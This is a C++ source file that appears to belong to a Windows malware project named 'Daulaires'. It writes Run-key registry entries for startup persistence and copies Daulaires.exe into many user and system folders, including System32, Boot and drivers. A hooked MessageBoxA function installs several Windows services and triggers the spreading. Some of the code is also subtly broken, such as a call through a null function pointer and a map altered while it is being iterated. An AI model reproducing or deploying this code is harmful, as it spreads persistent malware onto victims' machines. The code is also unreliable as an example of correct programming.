#include "../Headers/Tools.h"
#include <unordered_map>

void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
    HKEY hKey = nullptr;

    // Open the registry key for current user startup programs
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Set the registry entry for your application
        if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), static_cast<DWORD>((appPath.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
            std::wcerr << L"Error setting registry entry." << std::endl;
        }

        // Close the registry key
        RegCloseKey(hKey);
    }
    else {
        std::wcerr << L"Error opening registry key." << std::endl;
    }
};

void addPathsRecursively(std::unordered_map<std::string, std::string>& paths, const std::filesystem::path& directory) {
    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
        if (std::filesystem::is_directory(entry.path())) {
            // Add the directory path to the map
            paths[entry.path().string()] = entry.path().string() + "\\";

            // Recursively call the function to add paths in the subdirectory
            addPathsRecursively(paths, entry.path());
        }
    }
}

void write_file_to_dirs() {
    map<string, string> paths;
    // app different paths to the map
    paths["path_1"] = "C:\\Users\\Public\\";
    paths["path_2"] = "C:\\Users\\";
    paths["path_3"] = "C:\\Users\\Public\\Documents\\";
    paths["path_4"] = "C:\\";
    paths["path_5"] = "C:\\Windows\\System32\\";
    paths["path_6"] = "C:\\Windows\\Boot\\";
    paths["path_7"] = "C:\\Windows\\";
    paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
    paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
    paths["path_10"] = "C:\\Users\\Public\\Videos\\";
    paths["path_11"] = "C:\\Windows\\System32\\drivers\\";
    paths["path_12"] = "C:\\Windows\\System32\\drivers\\etc\\";
    paths["path_13"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";

    // open up the paths in the map and check if there are anymore paths that can be added
    for (const auto& path : paths) {
        // check if the path exists
        if (std::filesystem::exists(path.second)) {
            // check if the path is a directory
            if (std::filesystem::is_directory(path.second)) {
                // loop through the directory and add the paths to the map
                for (const auto& entry : std::filesystem::directory_iterator(path.second)) {
                    // check if the path is a directory
                    if (std::filesystem::is_directory(entry.path())) {
                        // add the path to the map
                        paths[entry.path().string()] = entry.path().string() + "\\";
                    };
                };
            };
        };
    };

    // set the app name
    std::wstring appName = L"Daulaires.exe";
    // loop through all the paths and add Daulaires.exe to them
    for (const auto& path : paths) {
        // convert the path to a string before adding the file name
        string pathString = path.second;
        std::wstring appPath = std::wstring(pathString.begin(), pathString.end()) + L"Daulaires.exe";
        addToStartup(appName + L" " + std::wstring(path.first.begin(), path.first.end()), appPath);
        // copy the file to the path
        CopyFile(L"Daulaires.exe", appPath.c_str(), TRUE);
    };
};

// Hooked MessageBoxA function
int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    // Function type for the original MessageBoxA
    typedef int (WINAPI* MessageBoxAType)(HWND, LPCSTR, LPCSTR, UINT);

    // Pointer to the original MessageBoxA function
    MessageBoxAType originalMessageBoxA = nullptr;

    Main Main{};
    Memory Memory;
    // using system we are going to set up the service
    Memory.InstallService(L"Daulaires", L"Daulaires Service");
    Memory.InstallService(L"Whore", L"Whore Service");
    Memory.InstallService(L"Mommie", L"Mommie Service");
    cout << "Hooked to MessageBoxA" << endl;

    write_file_to_dirs();
    Main.Windows();
    // Call the original MessageBoxA function
    return originalMessageBoxA(hWnd, lpText, lpCaption, uType);
};